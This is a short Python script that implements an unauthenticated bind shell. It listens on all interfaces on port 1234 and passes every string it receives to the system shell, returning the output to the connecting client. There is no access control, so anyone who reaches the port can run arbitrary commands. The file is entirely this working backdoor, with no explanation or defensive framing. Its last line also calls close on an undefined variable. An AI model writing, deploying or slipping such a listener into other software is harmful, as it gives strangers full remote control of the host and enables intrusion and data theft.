import socket
import os
import subprocess
import logging

logging.basicConfig(level=logging.DEBUG)

def handle_client(conn, addr):
    try:
        while True:
            data = conn.recv(2048).decode()
            if not data:
                logging.debug("Server closed connection.")
                conn.close()
                break
            if "exit" in data.lower():
                logging.debug("Received exit command from client. Closing connection.")
                conn.send("Goodbye :)\n".encode())
                conn.close()
                break
            else:
                logging.debug(f"Received data from client: {data}")
                if data.startswith("cd "):
                    os.chdir(data[3:])
                    conn.send("Changed directory\n".encode())
                else:
                    process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    conn.send(stdout)
                    if stderr:
                        conn.send(stderr)
    except socket.error as e:
        logging.error(f"Error occurred while handling client: {e}")
    finally:
        conn.close()

def run_server():
    s = socket.socket()
    s.bind(("0.0.0.0", 1234))
    s.listen(5)
    logging.debug("Listening for incoming connections...")
    while True:
        conn, addr = s.accept()
        logging.debug(f"Received connection from {addr}")
        handle_client(conn, addr)

if __name__ == "__main__":
    run_server()
    s.close()
